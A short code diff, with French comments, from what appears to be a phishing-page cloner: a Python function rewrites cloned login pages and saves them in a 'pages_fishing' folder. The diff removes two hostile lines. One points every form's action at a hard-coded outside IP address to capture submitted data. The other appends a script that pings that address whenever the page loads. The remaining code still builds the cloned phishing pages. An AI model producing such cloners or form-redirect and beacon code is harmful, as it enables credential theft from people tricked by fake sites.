@@ -30,13 +30,10 @@ def clone(uuid,url):
     for formulaire in formulaires:
         # Modifier ou remplacer le champ "action"
         
-        formulaire['action'] = "http://89.3.229.135:8080/"
+        formulaire['action'] = ""
 
     # Afficher le HTML modifié
     page_content = soup.prettify()
-    # Ajoute a la page une requete get lorsqu'elle est ouverte
-    page_content += "\n<script>var xhr = new XMLHttpRequest();xhr.open('GET', 'http://89.3.229.135:8080/', true);xhr.send();</script>"
-
 
     fichier = open("./website/templates/pages/pages_fishing/"+str(uuid)+".html", "w", encoding="utf-8")
     fichier.write(page_content)
